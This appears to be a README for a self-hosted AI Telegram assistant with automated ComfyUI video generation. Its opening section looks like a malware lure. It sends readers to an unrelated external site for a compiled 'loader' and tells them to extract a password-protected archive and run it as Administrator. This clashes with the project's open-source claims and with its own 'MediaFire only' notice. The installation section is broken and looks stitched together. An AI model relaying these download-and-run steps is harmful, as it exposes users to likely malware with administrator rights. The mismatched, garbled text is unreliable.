<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

### 🎥 100% Open-Source Private AI Assistant with Native **【Automated AI Video Creation (ComfyUI 4-Shot 720p HD)】**
Turn natural language prompts into continuous multi-scene videos directly from Telegram! Send a message like *"Create a 90s nostalgia retro cafe story"*, and the agent autonomously orchestrates:
1. **LLM Screenplay Writing**: Automatically authors a 4-scene storyboard with synchronized scene prompts & sound design.
2. **ComfyUI Multi-Shot Rendering**: Dispatches and renders 4 sequential video shots via the local ComfyUI API.
3. **Seamless Transition Framing**: Extracts the end frame of each shot to seed the initial frame of the next shot, ensuring character & visual consistency.
4. **Lanczos 720p HD Upscaling & Audio Mixing**: Upscales to 720p HD, mixes background music/effects, and **delivers the final 20-second MP4 video directly to your Telegram chat**!

---

## ✨ Key Highlights & Features

### 🎬 1. Automated 4-Shot AI Video Pipeline (Killer Feature)
- **4-Scene Continuous Narrative**: Breaks beyond single-prompt limits to stitch 4 coherent shots (4 x 5s = 20s continuous short film).
- **Seamless Transition Framing**: Feeds previous shot end-frames into subsequent shots to eliminate scene jumping and facial inconsistency.
- **Lanczos 720p HD Upscaling & Audio Mixing**: Crystal-clear HD resolution with balanced sound design and ambient soundscapes.
- **Direct Telegram Video Delivery**: Automatically uploads rendered MP4 video files straight into your chat for instant mobile playback.

### 🧠 2. Asynchronous Dual-Model Architecture (Flexible Hardware Scaling)
- **100% Model Agnostic**: Switch models anytime in `.env` based on your available hardware (GPU VRAM / CPU RAM).
- **Front-Desk Interaction (Fast Chat)**: Instant NLP intent classification, multi-turn conversation, task status queries, and low-latency voice responses via Edge-TTS (Default: `qwen2.5-3b-instruct` / `llama-3.2-3b` / `phi-3-mini`).
- **Back-End Autonomous Execution (Heavy Coding & Tools)**: Deep coding, project scaffolding, automated debugging, and long-running workflows without blocking Telegram chat (Default: `gemma-4-12b-coder` / `qwen2.5-coder-7b` / `deepseek-coder`).

### 🎙️ 3. Full-Duplex Telegram Voice & Chat Interface
- **Speech-to-Text (STT)**: Offline, low-latency audio transcription powered by `faster-whisper`.
- **Text-to-Speech (TTS)**: Natural Chinese/English voice synthesized via `Edge-TTS` and delivered directly to your Telegram chat.
- **System Lifecycle Notifications**: Automatic proactive push notifications on service startup (`Online`) and shutdown (`Offline`).

### 🌐 4. Real-Time Web Search & Page Browsing
- **Live Search**: Instant online data retrieval for news, documentation, and live facts.
- **Webpage Reader**: Automated text extraction and summarization for any provided URL.

### ⏰ 5. Dynamic Smart Interval Scheduler
- **Adaptive Sleep Interval**: Zero CPU / resource overhead. Sleeps intelligently based on upcoming task execution timestamps.
- **Natural Language Parsing**: Automatically turns natural commands (*"Remind me the time every 1 minute"*, *"Daily backup at 3am"*) into active schedules.
- **Full CRUD Support**: Complete Create, Read, Update, and Delete operations for both scheduled jobs and general task boards.

### 📦 6. Portable Markdown Knowledge & Skill Memory
- Built on standard Markdown storage (`tasks.md`, `schedule_tasks.md`, `skills_memory.md`, `long_term_memory.md`, `chat_history.md`), making it 100% portable and ready for multi-agent workflows.

---

## 📁 Project Structure

```text
local-ai-telegram/
├── telegram_chat.py               # Main dual-model bot & background scheduler
├── project/
│   ├── video/                     # ComfyUI automated video generation pipeline
│   ├── skills/                    # Reusable Python skills & skills_memory.md
│   ├── memory/                    # chat_history.md & long_term_memory.md
│   ├── schedules/                 # schedule_tasks.md (Dynamic cron/interval tasks)
│   ├── task/                      # tasks.md (Active & completed task boards)
│   └── config/                    # Chat session & environment config
└── output/                        # Rendered MP4 video outputs
```

---

## 💻 Hardware Requirements & Model Scaling Matrix

You can freely choose and configure model combinations in your `.env` file according to your machine's hardware specs (GPU VRAM / System RAM):

| Tier | Hardware Specs | Recommended Front-Desk Model (`CHAT_MODEL`) | Recommended Back-End Coder (`CODER_MODEL`) | Video Capabilities |
| :--- | :--- | :--- | :--- | :--- |
| **Light / CPU** | 8GB - 16GB RAM (CPU only) | `qwen2.5-1.5b` / `llama-3.2-1b` | `qwen2.5-coder-3b` (Q4_K_M) | Text/Voice/Tools only |
| **Balanced** (Recommended) | 6GB - 8GB VRAM (e.g. RTX 3060/4060) | `qwen2.5-3b-instruct` | `qwen2.5-coder-7b` / `deepseek-coder-6.7b` | Lightweight ComfyUI Video |
| **Power / Heavy** | 12GB - 24GB VRAM (e.g. RTX 3080/4080/4090) | `qwen2.5-3b-instruct` / `llama-3.1-8b` | `gemma-4-12b-coder` / `qwen2.5-coder-14b` | 4-Shot 720p HD AI Video Generation |

---

## 🚀 Quick Start & Prerequisites

### 1. External Software Prerequisites
To run the full dual-model brain and automated video generation pipeline, you need the following local tools installed and running:

| Software | Purpose | Default Port / Model |
| :--- | :--- | :--- |
### 2. Installation & Configuration

1. **Clone the repository**:
   ```powershell
### 3. Start Assistant
```powershell
python telegram_chat.py
```

---

## 🔒 Security & Sandboxing
- Strict single-user Telegram whitelist authorization (`ALLOWED_USERNAME`).
- Dedicated workspace isolation (`project/` sandbox) to prevent unintentional filesystem modifications.
- Sensitive credentials (`BOT_TOKEN`) are strictly managed via `.env` and protected from git exposure.
